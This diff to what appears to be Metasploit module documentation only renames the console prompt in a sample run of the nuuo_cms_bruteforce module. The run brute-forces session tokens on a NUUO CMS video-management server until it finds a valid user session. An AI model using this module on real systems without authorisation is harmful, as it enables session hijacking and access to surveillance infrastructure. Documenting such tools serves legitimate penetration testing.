@@ -60,14 +60,14 @@ It is worth noticing that when a user logs in, the session has to be maintained 
 ### Tested on Windows 10 Pro x64 running NCS Server v2.1.0
 
 ```
-msf5 auxiliary(gather/nuuo_cms_bruteforce) > set rhosts 172.22.222.200
+msf auxiliary(gather/nuuo_cms_bruteforce) > set rhosts 172.22.222.200
 rhosts => 172.22.222.200
-msf5 auxiliary(gather/nuuo_cms_bruteforce) > exploit
+msf auxiliary(gather/nuuo_cms_bruteforce) > exploit
 
 [*] 172.22.222.200:5180 - Bruteforcing session - this might take a while, go get some coffee!
 [*] 172.22.222.200:5180 - Generating 2621440 session tokens
 [+] 172.22.222.200:5180 - Found valid user session: 42094216
 [*] 172.22.222.200:5180 - Time taken: 1384.588721601991 seconds; total tries 590893
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/nuuo_cms_bruteforce) >
+msf auxiliary(gather/nuuo_cms_bruteforce) >
 ```
